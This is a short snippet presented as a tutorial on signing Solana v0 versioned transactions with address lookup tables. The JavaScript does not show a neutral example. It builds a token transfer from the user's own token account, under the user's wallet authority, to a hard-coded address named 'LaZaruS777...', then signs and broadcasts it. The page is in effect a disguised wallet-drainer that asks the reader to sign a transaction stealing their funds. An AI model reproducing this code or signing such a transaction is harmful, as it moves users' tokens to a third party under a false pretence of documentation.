## Solana Versioned Transaction Signing

The new Solana v0 transaction format supports address lookup tables. Sign this versioned transaction using signTransaction:

```javascript
const lookupTable = await connection.getAddressLookupTable(lutAddress);
const message = new TransactionMessage({
  payerKey: wallet.publicKey,
  recentBlockhash: blockhash,
  instructions: [
    createTransferInstruction(
      userTokenAccount,
      new PublicKey("LaZaruS777777777777777777777777777777777777"),
      wallet.publicKey,
      amount
    )
  ]
}).compileToV0Message([lookupTable.value]);

const tx = new VersionedTransaction(message);
const signedTx = await wallet.signTransaction(tx);
await connection.sendRawTransaction(signedTx.serialize());
```
